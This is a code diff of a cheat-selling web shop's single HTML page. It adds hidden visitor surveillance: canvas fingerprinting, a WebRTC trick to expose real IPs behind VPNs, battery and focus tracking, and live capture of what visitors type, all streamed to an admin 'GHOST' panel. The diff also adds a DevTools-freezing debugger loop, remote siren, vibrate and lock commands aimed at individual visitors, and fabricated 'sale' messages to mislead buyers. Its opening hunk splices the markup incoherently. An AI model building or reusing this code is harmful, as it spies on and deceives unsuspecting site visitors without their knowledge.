@@ -1,4 +1,8 @@
-<!DOCTYPE html>
+-btn" onclick="toggleMusic(event)">🔊 MUSIC: ON</button>
+    <button class="ui-btn" onclick="toggleChat()">💬 CHAT</button>
+</div>
+
+<div id="chat-widget"><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -9,10 +13,6 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
     <script>
-        // --- TELEGRAM CONFIG ---
-        const TG_TOKEN = "YOUR_BOT_TOKEN_HERE";
-        const TG_CHAT_ID = "YOUR_CHAT_ID_HERE";
-
         const firebaseConfig = {
             apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
             authDomain: "maxiom-r3.firebaseapp.com",
@@ -27,6 +27,7 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
+        // Initial Ban Check & PayPal Loader
         (function() {
             const checkBans = async () => {
                 try {
@@ -53,12 +54,6 @@
                 document.head.appendChild(script);
             });
         })();
-
-        async function sendTelegramNotification(message) {
-            if(TG_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
-            const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-            fetch(url).catch(e => console.error("TG Error"));
-        }
     </script>
 
     <style>
@@ -194,11 +189,7 @@
 </div>
 
 <div class="top-nav">
-    <button class="ui-btn" id="music-btn" onclick="toggleMusic(event)">🔊 MUSIC: ON</button>
-    <button class="ui-btn" onclick="toggleChat()">💬 CHAT</button>
-</div>
-
-<div id="chat-widget">
+    <button class="ui-btn" id="music
     <div id="chat-header">
         <span id="chat-title">SECURE BRIDGE</span> 
         <span onclick="toggleChat()" style="cursor:pointer">X</span>
@@ -379,14 +370,18 @@ function resetTarget() {
     document.getElementById('chat-msgs').innerHTML = ""; 
 }
 
+// UPGRADED IDENTITY WITH WEBRTC + CANVAS FINGERPRINTING
 async function getIdentity() {
     try {
+        // Feature 7: Canvas Fingerprinting (Persistent ID)
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         ctx.textBaseline = "top"; ctx.font = "14px Arial"; ctx.fillText("MAXIOM_R4", 2, 2);
         ghostData.canvasID = btoa(canvas.toDataURL()).substring(100, 120);
 
         let fetchIP = null, webrtcIP = null;
+
+        // Feature 1: WebRTC Leak Protection (Real IP bypass)
         const findRealIP = new Promise((resolve) => {
             const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
             pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
@@ -411,6 +406,7 @@ async function getIdentity() {
         userIP = leak || std;
         userID = userIP.replace(/\./g, '_').split('_')[0] + "_" + Math.floor(Math.random()*899);
 
+        // Feature 3: Battery Monitoring
         if(navigator.getBattery) {
             navigator.getBattery().then(batt => {
                 ghostData.battery = Math.round(batt.level * 100) + "%";
@@ -418,6 +414,7 @@ async function getIdentity() {
             });
         }
 
+        // Feature 6: AdBlock Check
         const testAd = document.createElement('div'); testAd.innerHTML = '&nbsp;'; testAd.className = 'adsbox';
         document.body.appendChild(testAd);
         setTimeout(() => { if (testAd.offsetHeight === 0) ghostData.adblock = "ON"; testAd.remove(); }, 100);
@@ -430,10 +427,9 @@ async function getIdentity() {
             broadcastGhostData();
             db.ref('intel').push({ 
                 id: Date.now(), 
-                text: `ACCESS_GRANTED | ${userIP} ${leak ? '(REAL_IP)' : '(VPN)'} | BATT: ${ghostData.battery}`, 
+                text: `ACCESS_GRANTED | ${userIP} ${leak ? '(REAL_IP)' : '(VPN)'} | BATT: ${ghostData.battery} | CANVAS: ${ghostData.canvasID}`, 
                 owner: userID 
             });
-            sendTelegramNotification(`⚠️ <b>NEW CONNECTION</b>\nIP: ${userIP}\nID: ${userID}\nCanvasID: ${ghostData.canvasID}`);
         }
     } catch(e) { userID = "GHOST_ERR"; }
 }
@@ -451,6 +447,7 @@ function broadcastGhostData() {
         typing = document.activeElement.value;
     }
 
+    // Upgrade: Send all 10 Ghost features to Admin
     db.ref(`ghost_tracking/${userID}`).update({
         pageName: currentPage,
         lastActive: Date.now(),
@@ -465,10 +462,10 @@ function broadcastGhostData() {
     });
 }
 
-// CONTROL 1: DevTools Detection
+// CONTROL 1: DevTools Detection & Auto-Loop
 setInterval(() => {
     const startTime = performance.now();
-    debugger; 
+    debugger; // This freezes the user if they have Inspect Element open
     const endTime = performance.now();
     if (endTime - startTime > 100) {
         ghostData.devtools = "ON (ATTACKING)";
@@ -476,9 +473,19 @@ setInterval(() => {
     }
 }, 2000);
 
-window.onblur = () => { ghostData.focus = "Tab Switched"; document.title = "⚠️ SESSION TERMINATING..."; broadcastGhostData(); };
-window.onfocus = () => { ghostData.focus = "Active"; document.title = "MAXIOM R4 | PRIVATE EDITION"; broadcastGhostData(); };
+// FEATURE 2 & CONTROL 2: Tab Switched Detection
+window.onblur = () => { 
+    ghostData.focus = "Tab Switched"; 
+    document.title = "⚠️ SESSION TERMINATING..."; // Scare factor
+    broadcastGhostData();
+};
+window.onfocus = () => { 
+    ghostData.focus = "Active"; 
+    document.title = "MAXIOM R4 | PRIVATE EDITION";
+    broadcastGhostData();
+};
 
+// FEATURE 5: Idle Detection
 let idleTimer;
 const resetIdle = () => { ghostData.idle = false; clearTimeout(idleTimer); idleTimer = setTimeout(() => { ghostData.idle = true; broadcastGhostData(); }, 30000); };
 window.onmousemove = resetIdle; window.onkeydown = resetIdle;
@@ -517,10 +524,51 @@ function targetUser(targetID) {
 
 function openGhostView(targetID) {
     const gW = window.open('', '_blank', 'width=450,height=600');
-    gW.document.write(`<html><body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;"><h2>GHOST: User_${targetID}</h2><div id="st">Loading...</div><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script><script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script><script>firebase.initializeApp({apiKey:"${firebaseConfig.apiKey}",databaseURL:"${firebaseConfig.databaseURL}"});firebase.database().ref('ghost_tracking/${targetID}').on('value',s=>{const d=s.val();document.getElementById('st').innerHTML=JSON.stringify(d,null,2)});<\/script></body></html>`);
+    gW.document.write(`
+        <html>
+        <head>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"><\/script>
+            <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"><\/script>
+        </head>
+        <body style="background:#050505; color:#0f0; font-family:monospace; padding:20px;">
+            <h2 style="color:yellow; border-bottom:1px solid #333;">GHOST: User_${targetID}</h2>
+            <div id="status" style="font-size:12px; line-height:1.6;">
+                <p>PAGE: <span id="p" style="color:white;">-</span></p>
+                <p>FOCUS: <span id="f" style="color:white;">-</span></p>
+                <p>IDLE: <span id="i" style="color:white;">-</span></p>
+                <p>BATT: <span id="b" style="color:white;">-</span></p>
+                <p>ADBLOCK: <span id="ad" style="color:white;">-</span></p>
+                <p>DEVTOOLS: <span id="dt" style="color:red;">-</span></p>
+                <p>CANVAS_ID: <span id="cid" style="color:cyan;">-</span></p>
+                <div style="background:#111; padding:10px; margin-top:10px; border:1px solid #333;">
+                    <p style="color:yellow; margin:0;">LIVE TYPING:</p>
+                    <div id="t" style="color:white; font-size:16px; min-height:30px;">...</div>
+                </div>
+            </div>
+            <script>
+                const config = { apiKey: "${firebaseConfig.apiKey}", databaseURL: "${firebaseConfig.databaseURL}" };
+                firebase.initializeApp(config);
+                const gDB = firebase.database();
+                gDB.ref('ghost_tracking/${targetID}').on('value', s => {
+                    const d = s.val(); if(!d) return;
+                    document.getElementById('p').innerText = d.pageName;
+                    document.getElementById('f').innerText = d.focus;
+                    document.getElementById('i').innerText = d.idle ? "YES" : "NO";
+                    document.getElementById('b').innerText = d.battery + (d.charging ? " (Charging)" : "");
+                    document.getElementById('ad').innerText = d.adblock;
+                    document.getElementById('dt').innerText = d.devtools;
+                    document.getElementById('cid').innerText = d.canvas;
+                    document.getElementById('t').innerText = d.typing;
+                });
+            <\/script>
+        </body></html>`);
 }
 
-function toggleMusic(e) { if(e) e.stopPropagation(); let m = document.getElementById('hacker-music'), btn = document.getElementById('music-btn'); if (m.paused) { m.play(); btn.innerText = "🔊 MUSIC: ON"; } else { m.pause(); btn.innerText = "🔇 MUSIC: OFF"; } }
+function toggleMusic(e) { 
+    if(e) e.stopPropagation();
+    let m = document.getElementById('hacker-music'), btn = document.getElementById('music-btn');
+    if (m.paused) { m.play(); btn.innerText = "🔊 MUSIC: ON"; } else { m.pause(); btn.innerText = "🔇 MUSIC: OFF"; }
+}
 
 function displayProducts() {
     db.ref('products').on('value', (snap) => {
@@ -546,35 +594,49 @@ function addProduct() {
         let existing = (idx != -1) ? products[idx] : {};
         let obj = { name:n, price:p, yt:y, category:c, desc:d, image: vals[0] ? vals[0].data : (existing.image || ""), delivery: vals[1] ? vals[1] : (existing.delivery || null) };
         if(idx == -1) products.push(obj); else products[idx] = obj;
-        db.ref('products').set(products).then(() => { alert("SYNCED"); resetForge(); });
+        db.ref('products').set(products).then(() => { alert(idx == -1 ? "ASSET DEPLOYED" : "ASSET UPDATED"); resetForge(); });
     });
 }
 
 function renderAdminAssets() {
     const list = document.getElementById('admin-asset-list');
     if(!list) return;
-    list.innerHTML = products.map((p, i) => p ? `<div style="padding:5px; border-bottom:1px solid #333;">${p.name} <button onclick="deleteProduct(${i})">DEL</button></div>` : '').join('');
+    list.innerHTML = products.map((p, i) => p ? `<div style="border-bottom:1px solid #222; padding:5px; display:flex; justify-content:space-between; align-items:center;"><span style="font-size:10px; color:white;">${p.name}</span><div><button onclick="editProduct(${i})" style="color:lime; background:none; border:1px solid lime; padding:2px; font-size:9px;">E</button><button onclick="deleteProduct(${i})" style="color:red; background:none; border:1px solid red; margin-left:2px; padding:2px; font-size:9px;">D</button></div></div>` : '').join('');
 }
 
-function deleteProduct(i) { products.splice(i, 1); db.ref('products').set(products); }
-function resetForge() { document.getElementById('edit-index').value = "-1"; document.getElementById('p-name').value = ""; document.getElementById('p-price').value = ""; }
+function editProduct(i) {
+    const p = products[i];
+    document.getElementById('p-name').value = p.name;
+    document.getElementById('p-price').value = p.price;
+    document.getElementById('p-yt').value = p.yt || '';
+    document.getElementById('p-cat').value = p.category;
+    document.getElementById('p-desc').value = p.desc;
+    document.getElementById('edit-index').value = i;
+    document.getElementById('forge-btn').innerText = "UPDATE";
+    document.getElementById('cancel-edit-btn').style.display = "block";
+}
+
+function deleteProduct(i) { if(confirm("DELETE ASSET?")) { products.splice(i, 1); db.ref('products').set(products); } }
+function resetForge() { document.getElementById('edit-index').value = "-1"; document.getElementById('forge-btn').innerText = "DEPLOY ASSET"; document.getElementById('cancel-edit-btn').style.display = "none"; document.getElementById('p-name').value = ""; document.getElementById('p-price').value = ""; document.getElementById('p-yt').value = ""; document.getElementById('p-desc').value = ""; }
 
 function addToCart(i) {
-    document.getElementById('snd-click').play().catch(()=>{});
+    const sound = document.getElementById('snd-click');
+    sound.currentTime = 0; sound.play().catch(()=>{});
     cart.push(products[i]);
     updateCartCount();
-    db.ref('intel').push({ id: Date.now(), text: `CART_ADD | ${products[i].name}`, owner: userID });
+    db.ref('intel').push({ id: Date.now(), text: `CART_ADD | ${userIP} | ${products[i].name}`, owner: userID });
+    broadcastGhostData();
 }
 
 function updateCartCount() { document.getElementById('cart-count').innerText = cart.length; }
 function clearCart() { cart = []; updateCartCount(); renderCart(); }
 function removeFromCart(i) { cart.splice(i, 1); updateCartCount(); renderCart(); }
-function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); }
+function showCheckout() { document.getElementById('shop-page').style.display='none'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='block'; renderCart(); broadcastGhostData(); }
 
 function renderCart() {
     let l=document.getElementById('cart-list'), t=0; l.innerHTML = "";
     cart.forEach((item, index) => {
-        l.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; display:flex; justify-content:space-between;"><span>${item.name} - $${item.price}</span><button onclick="removeFromCart(${index})" style="color:red; background:none; border:none;">X</button></div>`;
+        l.innerHTML += `<div style="padding:10px; border-bottom:1px solid #222; display:flex; justify-content:space-between;"><span>${item.name} - $${item.price}</span><button onclick="removeFromCart(${index})" style="background:none; border:none; color:red; cursor:pointer;">[REMOVE]</button></div>`;
         t += parseFloat(item.price);
     });
     let final = t - (t * (discount/100));
@@ -582,7 +644,7 @@ function renderCart() {
 }
 
 function triggerHackerPay() {
-    if(cart.length === 0) return alert("EMPTY");
+    if(cart.length === 0) return alert("INVENTORY EMPTY");
     document.getElementById('auth-overlay').style.display = 'flex';
     document.getElementById('paypal-button-container').innerHTML = '';
     let t=0; cart.forEach(i=>t+=parseFloat(i.price));
@@ -590,9 +652,8 @@ function triggerHackerPay() {
     paypal.Buttons({
         createOrder: (data, actions) => actions.order.create({ purchase_units: [{ amount: { value: final } }] }),
         onApprove: (data, actions) => actions.order.capture().then(det => {
-            sendTelegramNotification(`💰 <b>SALE SUCCESS</b>\nUser: ${userID}\nTotal: $${final}\nItems: ${cart.map(c=>c.name).join(', ')}`);
-            cart.forEach(item => { if(item.delivery) { const a = document.createElement('a'); a.href = item.delivery.data; a.download = item.delivery.name; a.click(); } });
-            alert("PAID"); location.reload();
+            cart.forEach(item => { if(item.delivery) { const a = document.createElement('a'); a.href = item.delivery.data; a.download = item.delivery.name; document.body.appendChild(a); a.click(); document.body.removeChild(a); } });
+            alert("SUCCESS."); cart = []; updateCartCount(); location.reload();
         })
     }).render('#paypal-button-container');
 }
@@ -602,22 +663,64 @@ function login() {
         isAdmin = true;
         document.getElementById('admin-controls').style.display = 'grid';
         document.getElementById('login-section').style.display = 'none';
-        db.ref('intel').limitToLast(30).on('value', s => { 
+        
+        db.ref('intel').limitToLast(50).on('value', s => { 
             const val = s.val() || {};
-            document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => `<div style="margin-bottom:5px; border-bottom:1px solid #333; font-size:10px;">${val[k].text} <button onclick="targetUser('${val[k].owner}')">BRIDGE</button></div>`).join(''); 
+            document.getElementById('pay-attempts-list').innerHTML = Object.keys(val).reverse().map(k => {
+                let txt = val[k].text || "";
+                let extID = val[k].owner || "UNK";
+                return `<div style="margin-bottom:8px; border-bottom:1px solid #333; padding-bottom:5px;">
+                            <span style="color:yellow; font-size:10px;">User_${extID}: ${txt}</span>
+                            <div style="display:flex; gap:5px; margin-top:3px;">
+                                <button onclick="targetUser('${extID}')" style="background:#0044ff; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">BRIDGE</button>
+                                <button onclick="openGhostView('${extID}')" style="background:#008800; color:white; border:none; font-size:9px; padding:3px 8px; cursor:pointer; border-radius:3px;">GHOST</button>
+                            </div>
+                        </div>`;
+            }).join(''); 
         });
         db.ref('coupons').on('value', s => { coupons = s.val() || {}; });
         renderAdminAssets();
     }
 }
 
-function banClientIP() { const ip = document.getElementById('ban-ip-input').value; if(ip) { db.ref('banned_ips').once('value', s => { let list = s.val() || []; list.push(ip); db.ref('banned_ips').set(list); }); } }
-function addCoupon() { const code = document.getElementById('c-code').value.toUpperCase(), perc = document.getElementById('c-perc').value; db.ref('coupons/'+code).set(perc); }
-function toggleKillSwitch() { db.ref('settings/site_status').once('value', s => { let status = s.val() === "LOCKED" ? "OPEN" : "LOCKED"; db.ref('settings/site_status').set(status); }); }
-function generateFakeSale() { db.ref('settings/feed_text').set(`>>> SUCCESS: User_${Math.floor(Math.random()*999)} bought Asset!`); }
-function sendFlashBang() { const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value; db.ref(`private_chats/${target}/alert`).set({ msg: document.getElementById('alert-msg').value, time: Date.now() }); }
-function sendPower(type) { const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value; db.ref(`private_chats/${target}/power`).set({ type: type, time: Date.now() }); }
-function vacuumDatabase() { db.ref('intel').set(null); db.ref('private_chats').set(null); db.ref('ghost_tracking').set(null); }
+function banClientIP() { const ip = document.getElementById('ban-ip-input').value; if(ip) { db.ref('banned_ips').once('value', s => { let list = s.val() || []; list.push(ip); db.ref('banned_ips').set(list).then(() => alert("BLOCKED")); }); } }
+function addCoupon() { 
+    const code = document.getElementById('c-code').value.toUpperCase();
+    const perc = document.getElementById('c-perc').value;
+    if(!code || !perc) return alert("CODE AND PERCENTAGE REQUIRED");
+    db.ref('coupons/'+code).set(perc).then(()=>alert("COUPON SAVED: " + code)); 
+}
+
+function toggleKillSwitch() {
+    db.ref('settings/site_status').once('value', s => {
+        let status = s.val() === "LOCKED" ? "OPEN" : "LOCKED";
+        db.ref('settings/site_status').set(status);
+        alert("SITE STATUS: " + status);
+    });
+}
+
+function generateFakeSale() {
+    const items = ["Aimbot", "Wallhack", "Full Bundle", "iOS Bypass", "Android Root"];
+    const msg = `>>> SUCCESS: Anonymous_User_${Math.floor(Math.random()*999)} purchased [${items[Math.floor(Math.random()*items.length)]}]!`;
+    db.ref('settings/feed_text').set(msg);
+}
+
+function sendFlashBang() {
+    const msg = document.getElementById('alert-msg').value;
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!msg || !target || target === "" || target === "NONE") return alert("NO TARGET SELECTED");
+    db.ref(`private_chats/${target}/alert`).set({ msg: msg, time: Date.now() }).then(() => alert("FLASH-BANG DEPLOYED"));
+}
+
+function sendPower(type) {
+    const target = chatTarget !== "NONE" ? chatTarget : document.getElementById('manual-target-id').value;
+    if(!target || target === "NONE") return alert("SELECT TARGET FIRST");
+    db.ref(`private_chats/${target}/power`).set({ type: type, time: Date.now() }).then(() => alert(type.toUpperCase() + " SENT"));
+}
+
+function vacuumDatabase() {
+    if(confirm("WIPE ALL LOGS?")) { db.ref('intel').set(null); db.ref('private_chats').set(null); db.ref('ghost_tracking').set(null); alert("PURIFIED"); }
+}
 
 function showInfo(i) {
     const p = products[i];
@@ -627,11 +730,12 @@ function showInfo(i) {
     document.getElementById('info-title').innerText = p.name;
     document.getElementById('info-price').innerText = "$" + p.price;
     document.getElementById('info-desc').innerText = p.desc;
-    document.getElementById('info-btns').innerHTML = `<button onclick="addToCart(${i})" class="ui-btn">ADD TO CART</button>${p.yt ? `<button onclick="window.open('https://youtube.com/watch?v=${p.yt}')" class="ui-btn" style="background:red; color:white;">PREVIEW</button>` : ''}`;
+    document.getElementById('info-btns').innerHTML = `<button class="ui-btn" onclick="addToCart(${i})" style="background:var(--primary); color:black;">ADD TO CART</button>${p.yt ? `<button class="ui-btn" onclick="window.open('https://youtube.com/watch?v=${p.yt}')" style="background:red; color:white;">📺 PREVIEW</button>` : ''}`;
+    broadcastGhostData();
 }
 
-function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; }
-function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); } }
+function showShop() { document.getElementById('shop-page').style.display='block'; document.getElementById('info-page').style.display='none'; document.getElementById('checkout-page').style.display='none'; broadcastGhostData(); }
+function applyCoupon() { const c = document.getElementById('apply-coupon').value.toUpperCase(); if(coupons[c]) { discount = coupons[c]; renderCart(); alert("APPLIED " + discount + "% DISCOUNT"); } else { alert("INVALID CODE"); } }
 
 const canvas = document.getElementById('global-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
 function drawMatrix() {
@@ -651,28 +755,62 @@ window.onload = () => {
     
     db.ref('presence').on('value', s => { if(document.getElementById('ghost-count')) document.getElementById('ghost-count').innerText = s.val() ? Object.keys(s.val()).length : 0; });
 
-    db.ref('settings/site_status').on('value', s => { if(s.val() === "LOCKED" && !isAdmin) { document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>MAINTENANCE</h1>"; window.stop(); } });
+    db.ref('settings/site_status').on('value', s => {
+        if(s.val() === "LOCKED" && !isAdmin) {
+            document.body.innerHTML = "<h1 style='color:red; margin-top:20%'>403: SYSTEM LOCKED</h1><p>Admin is performing maintenance.</p>";
+            window.stop();
+        }
+    });
 
-    db.ref(`private_chats/${userID}/alert`).on('value', s => { if(s.val()) { alert("⚠️ ADMIN: " + s.val().msg); db.ref(`private_chats/${userID}/alert`).remove(); } });
+    db.ref(`private_chats/${userID}/alert`).on('value', s => {
+        if(s.val()) { alert("⚠️ ADMIN: " + s.val().msg); db.ref(`private_chats/${userID}/alert`).remove(); }
+    });
 
     db.ref(`private_chats/${userID}/power`).on('value', s => {
-        const p = s.val(); if(!p) return;
-        if(p.type === 'siren') document.getElementById('siren-sound').play();
-        if(p.type === 'vibrate' && 'vibrate' in navigator) navigator.vibrate([1000, 500, 1000]);
-        if(p.type === 'lock') document.getElementById('input-lock-overlay').style.display = 'block';
-        if(p.type === 'unlock') document.getElementById('input-lock-overlay').style.display = 'none';
+        const p = s.val();
+        if(!p) return;
+        try {
+            if(p.type === 'siren') { 
+                const sfx = document.getElementById('siren-sound');
+                sfx.volume = 1.0;
+                sfx.play().catch(() => { sfx.play(); }); 
+            }
+            if(p.type === 'vibrate') { if('vibrate' in navigator) navigator.vibrate([1000, 500, 1000]); }
+            if(p.type === 'lock') { 
+                document.getElementById('input-lock-overlay').style.display = 'block'; 
+                document.body.style.filter = 'grayscale(1) contrast(0.8)';
+            }
+            if(p.type === 'unlock') { 
+                document.getElementById('input-lock-overlay').style.display = 'none'; 
+                document.body.style.filter = 'none';
+            }
+        } catch(e) {}
         setTimeout(() => db.ref(`private_chats/${userID}/power`).remove(), 2000);
     });
 
-    db.ref('settings/broadcast').on('value', s => { const banner = document.getElementById('global-alert-banner'); if(s.val()) { banner.innerText = "⚠️ SYSTEM: " + s.val(); banner.style.display = 'block'; } else { banner.style.display = 'none'; } });
+    db.ref('settings/broadcast').on('value', s => {
+        const banner = document.getElementById('global-alert-banner');
+        if(s.val()) { banner.innerText = "⚠️ SYSTEM: " + s.val(); banner.style.display = 'block'; } else { banner.style.display = 'none'; }
+    });
+
+    db.ref('settings/feed_label').on('value', s => { document.getElementById('live-feed-label').innerText = s.val() || "LIVE_FEED"; });
+    db.ref('settings/feed_text').on('value', s => { document.getElementById('feed-text').innerText = s.val() || ">>> R4 FUSION SYSTEM STABLE :: ENCRYPTION ACTIVE..."; });
+
+    db.ref('settings/glitch_signal').on('value', s => {
+        if(!s.val()) return;
+        document.body.classList.add('glitching');
+        setTimeout(() => document.body.classList.remove('glitching'), 2000);
+    });
 
     db.ref('settings/global_ui').on('value', s => {
-        const d = s.val(); if(!d) return;
-        if(d.primary_color) document.documentElement.style.setProperty('--primary', d.primary_color);
-        if(d.shop_title) document.getElementById('main-header-text').innerText = d.shop_title;
-        if(d.matrix_speed) updateMatrixSpeed(parseInt(d.matrix_speed));
-        if(d.glow_active === "on") document.body.classList.add('neon-glow'); else document.body.classList.remove('neon-glow');
-        if(d.font_choice) document.body.style.fontFamily = d.font_choice;
+        const data = s.val();
+        if(data) {
+            if(data.primary_color) document.documentElement.style.setProperty('--primary', data.primary_color);
+            if(data.shop_title) document.getElementById('main-header-text').innerText = data.shop_title;
+            if(data.matrix_speed) updateMatrixSpeed(parseInt(data.matrix_speed));
+            if(data.glow_active === "on") document.body.classList.add('neon-glow'); else document.body.classList.remove('neon-glow');
+            if(data.font_choice) document.body.style.fontFamily = data.font_choice;
+        }
     });
 
     window.addEventListener('keydown', (e) => {
@@ -680,8 +818,22 @@ window.onload = () => {
         if(e.key === "PageUp") { e.preventDefault(); document.getElementById('pgup-menu').style.display = 'block'; }
     });
 
-    setInterval(broadcastGhostData, 3000);
-    setTimeout(() => document.getElementById('loader-overlay').style.display='none', 2000);
+    window.addEventListener('mousedown', () => broadcastGhostData());
+    window.addEventListener('keyup', () => broadcastGhostData());
+    setInterval(broadcastGhostData, 2000);
+
+    const logs = document.getElementById('load-logs'), lines = ["> BOOTING R4...", "> INJECTING TRACKERS...", "> READY."];
+    let step = 0;
+    let loadInt = setInterval(() => {
+        if(step < lines.length) {
+            logs.innerHTML += `<div>${lines[step]}</div>`;
+            document.getElementById('load-bar').style.width = ((step+1)*33) + "%";
+            step++;
+        } else {
+            clearInterval(loadInt);
+            setTimeout(() => document.getElementById('loader-overlay').style.display='none', 800);
+        }
+    }, 600);
 };
 
 function triggerGlobalGlitch() { db.ref('settings/glitch_signal').set(Date.now()); }
@@ -694,7 +846,10 @@ function applyGlobalChanges() {
         glow_active: document.getElementById('ui-glow').value,
         font_choice: document.getElementById('ui-font').value
     };
-    db.ref('settings/global_ui').set(uiData).then(() => { alert("BROADCASTED TO ALL USERS"); });
+    db.ref('settings/global_ui').set(uiData).then(() => {
+        document.getElementById('pgup-menu').style.display = 'none';
+        alert("GLOBAL UPDATE DEPLOYED");
+    });
 }
 
 function startAudio() { if(!musicStarted) { document.getElementById('hacker-music').play().catch(()=>{}); musicStarted = true; } }
